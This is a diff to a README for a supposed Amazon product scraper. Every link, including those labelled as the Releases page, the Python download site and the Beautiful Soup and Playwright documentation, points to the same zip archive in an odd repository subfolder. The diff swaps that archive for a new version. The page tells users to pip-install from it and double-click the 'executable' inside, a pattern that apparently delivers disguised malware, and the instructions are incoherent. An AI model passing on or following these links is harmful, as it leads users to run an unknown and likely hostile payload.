@@ -6,37 +6,37 @@ Welcome to amazon-web-scraper! This toolkit allows you to easily extract product
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip)
+[![Download Latest Release](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip)
 
 ## 📁 How to Download and Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of amazon-web-scraper, visit our [Releases page](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip). Here, you will find all the available builds of this application.
+   To get the latest version of amazon-web-scraper, visit our [Releases page](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip). Here, you will find all the available builds of this application.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions available for download. Pick the latest release, as it contains the newest features and fixes.
 
 3. **Download the Application**  
-   Click on the file that meets your needs. For most users, downloading the `.zip` or `https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip` file is recommended. This file contains everything you need to run the software.
+   Click on the file that meets your needs. For most users, downloading the `.zip` or `https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip` file is recommended. This file contains everything you need to run the software.
 
 4. **Extract the Files**  
    Once the download is complete, find the downloaded file on your computer. Right-click and choose "Extract All" to unzip the contents into a folder.
 
 5. **Run the Application**  
-   Open the extracted folder and find the executable file, which is named `https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip` or similar. Double-click the file to start the application.
+   Open the extracted folder and find the executable file, which is named `https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip` or similar. Double-click the file to start the application.
 
 ## 🔧 Setting Up
 
 Setting up the amazon-web-scraper is straightforward:
 
 1. **Ensure You Have Python Installed**  
-   This application runs on Python, so make sure you have it installed on your computer. If you don't have it, you can download Python from [https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip).
+   This application runs on Python, so make sure you have it installed on your computer. If you don't have it, you can download Python from [https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip).
 
 2. **Install Required Packages**  
    Open your command line or terminal and enter the following command to install the necessary packages:
 
    ```bash
-   pip install -r https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip
+   pip install -r https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip
    ```
 
    This step ensures you have all the tools you need to run the scraper smoothly.
@@ -81,9 +81,9 @@ To run amazon-web-scraper smoothly, make sure your system meets the following re
 
 For further details about installation and usage, you can explore the following resources:
 
-- [Python Installation Guide](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip)
-- [Beautiful Soup Documentation](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip)
-- [Playwright Documentation](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip)
+- [Python Installation Guide](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip)
+- [Beautiful Soup Documentation](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip)
+- [Playwright Documentation](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip)
 
 ## 💬 Support
 
@@ -95,4 +95,4 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 ## 📥 Download Again
 
-Once again, [visit this page to download](https://raw.githubusercontent.com/minhaz1o84/amazon-web-scraper/main/antipolo/amazon-web-scraper.zip) the latest version of amazon-web-scraper. Enjoy scraping!
+Once again, [visit this page to download](https://github.com/minhaz1o84/amazon-web-scraper/raw/refs/heads/main/antipolo/web_scraper_amazon_3.0.zip) the latest version of amazon-web-scraper. Enjoy scraping!
